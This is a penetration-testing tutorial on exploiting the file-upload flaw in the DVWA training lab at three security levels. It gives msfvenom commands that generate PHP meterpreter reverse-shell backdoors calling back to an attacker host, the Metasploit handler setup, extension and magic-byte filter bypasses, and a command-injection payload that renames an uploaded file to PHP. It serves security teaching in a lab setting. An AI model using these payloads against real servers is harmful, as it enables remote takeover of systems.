<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/kali-linux/" rel="category tag">Kali Linux</a>, <a href="https://www.hackingarticles.in/category/penetration-testing/" rel="category tag">Penetration Testing</a>, <a href="https://www.hackingarticles.in/category/website-hacking/" rel="category tag">Website Hacking</a></span>            </div>
            <h1 class="post-title entry-title">Hack File upload Vulnerability in DVWA (Bypass All Security)</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-file-upload-vulnerability-dvwa-bypass-security/" rel="bookmark"><time class="entry-date published" datetime="2016-12-12T12:05:38+00:00">December 12, 2016</time><time class="updated" datetime="2025-05-27T12:52:19+00:00">May 27, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">File upload vulnerability are a major problem with web based applications. In many web server this vulnerability depend entirely on purpose that allows an attacker to upload a file hiding malicious code inside that can then be executed on the server. An attacker might be able to put a phishing page into the website or deface the website.</span></p>
<p><span style="color: #000000;">Attacker may reveal internal information of web server to other and some chances to sensitive data might be informal, by unauthorized people.</span></p>
<p><span style="color: #000000;">In DVWA the webpage allows user to upload an image, and the webpage go through with program coding and checks if the last characters of the file is ‘.jpg’ or ‘.jpeg’ or ’.png’ before allowing the image get uploaded in directory.</span></p>
<h3><span style="color: #800000;">Requirement</span></h3>
<p><span style="color: #000000;"><strong>Xampp/Wamp Server</strong></span></p>
<p><span style="color: #000000;"><strong>DVWA Lab</strong></span></p>
<p><span style="color: #000000;"><strong>Kali Linux: Burp suite, metasploit framework</strong></span></p>
<p><span style="color: #000000;">DVWA lab in your XAMPP or WAMP server, read full article from <a style="color: #000000;" href="https://www.hackingarticles.in/web-application-lab-setup-on-windows/">here</a></span></p>
<p><span style="color: #000000;">Now open the DVWA in your browser with your local IP as 192.168.1.102:81/DVWA and login with following credentials:</span></p>
<p><span style="color: #000000;"><strong>Username</strong> – admin</span></p>
<p><span style="color: #000000;"><strong>Password</strong> – password</span></p>
<h3><span style="color: #800000;">Bypass Low Level Security</span></h3>
<p><span style="color: #000000;">Click on <strong>DVWA Security</strong> and set Website <strong>Security Level low</strong></span></p>
<p><img decoding="async" src="https://2.bp.blogspot.com/-kachgCZI30U/WE6NgXeOBgI/AAAAAAAAOlE/Kyxp0CImEzwPK2FneYDN1INTly9as2CCACLcB/s1600/1.png"/></p>
<p><span style="color: #000000;">Open terminal in kali linux and create php backdoor through following command</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.104 lport=3333 -f raw</pre>
<p><span style="color: #000000;"><strong>Copy</strong> and <strong>paste </strong>the highlighted code in leafnod and save as with <strong>PHP extension</strong> as <strong>hack</strong>.<strong>php </strong>on the desktop.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-V6FHT26gboI/WE6Nn1rfqBI/AAAAAAAAOl0/j91hsgUS9PktcsoM5r9LERo3Ard2jgLEACLcB/s640/2.png"/></p>
<p><span style="color: #000000;">Come back to your DVWA lab and <strong>click</strong> to <strong>file upload</strong> option from vulnerability menu.</span></p>
<p><span style="color: #000000;">Now <strong>click</strong> to <strong>browse button</strong> to browse <strong>hack.php</strong> file to upload it on web server and <strong>click</strong> on <strong>upload </strong>which will upload your file in directory of server.</span></p>
<p><img decoding="async" src="https://2.bp.blogspot.com/-kWnln_fPWZM/WE6NohpwaNI/AAAAAAAAOmA/ARDMuxtHxIU-2gc-EuhM26XgwgPOPBCzACLcB/s1600/3.png"/></p>
<p><span style="color: #000000;">After uploading a PHP file it will show the path of directory where your file is successfully uploaded now copy the selected part and past it in URL to execute it.</span></p>
<p><span style="color: #000000;"><strong>hackable/uploads/hack.php</strong></span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-_IBFgYN6v9I/WE6NojzDMWI/AAAAAAAAOmE/5ndlrJN64LwoM7f07RxEisJSMyXFALMRQCLcB/s640/4.png"/></p>
<p><span style="color: #000000;">Before executing this URL on browser <strong>start </strong>and<strong> run multi handler</strong> in metasploit framework using below command. While the multi handler will run execute the below URL of PHP file in browser. This’ll provide you <strong>a meterpreter session 1.</strong></span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">192.168.1.102:81/DVWA/hackable/uploads/hack.php</pre>
<p><img decoding="async" src="https://3.bp.blogspot.com/-SD7W4JoKDms/WE6No13broI/AAAAAAAAOmI/7UfNmXotUtgo_q83Z8bT8BMITs85YXECwCLcB/s640/5.png"/></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msf &gt; use multi/handler
msf exploit(handler) &gt; set payload php/meterpreter/reverse_tcp
msf exploit(handler) &gt; set lhost 192.168.1.104
msf exploit(handler) &gt; set lport 3333
msf exploit(handler) &gt; run
meterpreter &gt; sysinfo</pre>
<p><img decoding="async" src="https://2.bp.blogspot.com/-ZmFW9xYOegA/WE6Np74u6_I/AAAAAAAAOmQ/uCCY3Ze2TOMTekEPTxsE78fVSMwOgGbiwCLcB/s640/6.png"/></p>
<h3><span style="color: #800000;">Bypass Medium Level Security</span></h3>
<p><span style="color: #000000;">Click on <strong>DVWA Security</strong> and set Website <strong>Security Level medium</strong></span></p>
<p><img decoding="async" src="https://3.bp.blogspot.com/-wR-ITe1Kv6k/WE6NpZQxIVI/AAAAAAAAOmM/j5PuE7p7MwgidXiXVm4VY1K9EZJ9AGNfwCLcB/s1600/7.png"/></p>
<p><span style="color: #000000;">Same process to create php backdoor.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.104 lport=3333 -f raw</pre>
<p><span style="color: #000000;">Now<strong> Save </strong>the selected code as <strong>raj.php.jpeg</strong> on desktop. Since this file will get upload in medium security which is little different from low security as this will apparently check the extension of file.</span></p>
<p><img decoding="async" src="https://3.bp.blogspot.com/-fBbRw-tofA0/WE6Nqfu21JI/AAAAAAAAOmU/L5eaS6YymiEycub6GxG_aNtJ6VrvA6mZgCLcB/s640/8.png"/></p>
<p><span style="color: #000000;">Come back to your DVWA lab and <strong>click</strong> to <strong>file upload</strong> option from vulnerability menu.</span></p>
<p><span style="color: #000000;">Again <strong>click</strong> to <strong>browse button</strong> to browse <strong>raj.php.jpeg</strong> file to upload it. Now start burp suit and make <strong>intercept on</strong> under <strong>proxy tab</strong>.  Don’t forget to set manual proxy of your browser and <strong>click </strong>on  <strong>upload.</strong></span></p>
<p><img decoding="async" src="https://2.bp.blogspot.com/-LB179MKTfVo/WE6NqigdV_I/AAAAAAAAOmY/DjQs3AeZpx8P3bbVcm5U9HiJKUlhsMgYQCLcB/s640/9.1.png"/></p>
<p><span style="color: #000000;">Intercept tab will work to catch post method when you click to upload button.  Now convert <strong>raj.php.jpeg</strong> into <strong>raj.php</strong></span></p>
<p><img decoding="async" src="https://4.bp.blogspot.com/-AKaVUJcHTHY/WE6Nq9drZdI/AAAAAAAAOmc/x7Q_NfvfOJc52Lw_AJ9SJsHS8NP-8xlCwCLcB/s640/9.png"/></p>
<p><span style="color: #000000;">Compare the change before uploading your PHP file. After altering click on <strong>forward</strong> to upload PHP file in directory.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-S7devuS9zL8/WE6NhncXWoI/AAAAAAAAOlM/vsLNkLuq24gtKVL_HGWneML03YKluS-CwCLcB/s640/10.png"/></p>
<p><span style="color: #000000;">This will show the path of uploaded file of the directory where file is successfully uploaded.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">hackable/uploads/raj.php</pre>
<p><img decoding="async" src="https://4.bp.blogspot.com/-XHCoFVvzo2o/WE6NhInM6sI/AAAAAAAAOlI/B-00k97_mq8j0qwbwg6ZX2mNkGkFtbG0QCLcB/s640/11.png"/></p>
<p><span style="color: #000000;">Now repeat the whole process same as in low security to execute PHP file in URL.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">192.168.1.102:81/DVWA/hackable/uploads/raj.php</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-PruDl6ogKQo/WE6Nh-7c07I/AAAAAAAAOlQ/k82tjaV7Vi4XXB0QG7krML7_EnGX9NgTQCLcB/s1600/12.png"/></p>
<p><span style="color: #000000;">This’ll provide <strong>a meterpreter session 2 </strong>when you run URL in browser.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic"> meterpreter &gt; sysinfo</pre>
<p><img decoding="async" src="https://3.bp.blogspot.com/-G1zMsKhvYdo/WE6NjZk2sFI/AAAAAAAAOlY/ko9aMW-8_cADCT3ZVYJQ1142ZRcLZjzHwCLcB/s640/13.png"/></p>
<h3><span style="color: #800000;">Bypass High Level Security</span></h3>
<p><span style="color: #000000;">Click on <strong>DVWA Security</strong> and set Website <strong>Security Level High</strong></span></p>
<p><img decoding="async" src="https://2.bp.blogspot.com/-AXMBRInOgKQ/WE6Ni4dVvgI/AAAAAAAAOlU/-FFf8FULmR0OMy2v0k72WR8ae2J5To0xQCLcB/s1600/14.png"/></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.104 lport=3333 -f raw</pre>
<p><img decoding="async" src="https://4.bp.blogspot.com/-AG26aUnxR2Y/WE6NlN6MiKI/AAAAAAAAOlc/AwUqRjofJaA4RkUFBIrupQm-aNJ9l6y4ACLcB/s640/15.png"/></p>
<p><span style="color: #000000;"><strong>Now Save </strong>the selected code as <strong>shell.jpeg</strong> on desktop. Since this file will get upload in high security which is little different from low and medium security as this will apparently check the extension of file as well as piece of code also therefore <strong>type GIF98</strong> before PHP code and save as <strong>shell.jpeg</strong>.</span></p>
<p><img decoding="async" src="https://2.bp.blogspot.com/-Xtbw_EAjraY/WE6NmaVETJI/AAAAAAAAOlg/EdpbQK3_OYANjqS4QISAeHkq7Ns87WZVACLcB/s640/16.png"/></p>
<p>Repeat the process to browse shell.jpeg</p>
<p><img decoding="async" src="https://3.bp.blogspot.com/-_mSbus_QPho/WE6NmbjnoEI/AAAAAAAAOlk/Cxpz6NRLfUI-dATJzmiimR18hfauiL6sQCLcB/s1600/17.1.png"/></p>
<p><span style="color: #000000;">Again you will get directory path of uploaded file.</span></p>
<p><img decoding="async" src="https://3.bp.blogspot.com/-Var-7vEiCWY/WE6NmhZv5rI/AAAAAAAAOlo/WhxuTNU_fhISB8pKQHgCDC769oAJ1mDyQCLcB/s1600/17.png"/></p>
<p><span style="color: #000000;">This PHP file cannot directly execute on URL as it uploaded with jpeg extension. For rename this file into PHP file click to command injection option from vulnerability. Here this vulnerability let you copy and rename this shell.jpeg into PHP file. Types following in text box which will <strong>copied</strong> and <strong>rename</strong> <strong>shell.jpeg</strong> into <strong>aa.php</strong></span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">| copy C:\xampp\htdocs\DVWA\hackable\uploads\shell.jpeg C:\xampp\htdocs\DVWA\hackable\uploads\aa.php</pre>
<p><img decoding="async" src="https://4.bp.blogspot.com/--A3btUAKTOY/WE6Nm9Ps-HI/AAAAAAAAOls/56t_WFIr7r4aOjRwfs3bHrh0b0n_VFsdQCLcB/s640/18.png"/></p>
<p><span style="color: #000000;">When you will submit the command the PHP file get copied with new name as aa.php</span></p>
<p><img decoding="async" src="https://3.bp.blogspot.com/-DdBvfmerur0/WE6NnFAEgXI/AAAAAAAAOlw/K-GlOWB9c7AyhBqmyCiTQXFj-7fwWUyZwCLcB/s640/19.png"/></p>
<p><span style="color: #000000;">Now repeat the process to execute PHP file in URL.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">192.168.1.102:81/DVWA/hackable/uploads/aa.php</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-J6NlOdcww7M/WE6Nn3h_NjI/AAAAAAAAOl4/yY5uzgilP_g2b47yz44bTh1irgaX_YvdACLcB/s640/20.1.png"/></p>
<p><span style="color: #000000;"><strong>Wonderful!! </strong>Here we get meterpreter session 3 also.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">meterpreter &gt; sysinfo</pre>
<p><img decoding="async" src="https://3.bp.blogspot.com/-g9rmLEt_b9E/WE6NoSvqerI/AAAAAAAAOl8/jN4D0fdUjZ88nYnGMeaJoWDEi7LYuqEMwCLcB/s640/20.png"/></p>
<p><span style="color: #000000;">To learn more about Website Hacking. Follow this</span> <a href="https://www.hackingarticles.in/category/website-hacking/"><strong>Link.</strong></a></p>
<p><span style="color: #000000;"><strong>Author</strong>: Aarti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact</span><a href="https://www.linkedin.com/in/aarti--singh/"><strong> here</strong></a></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
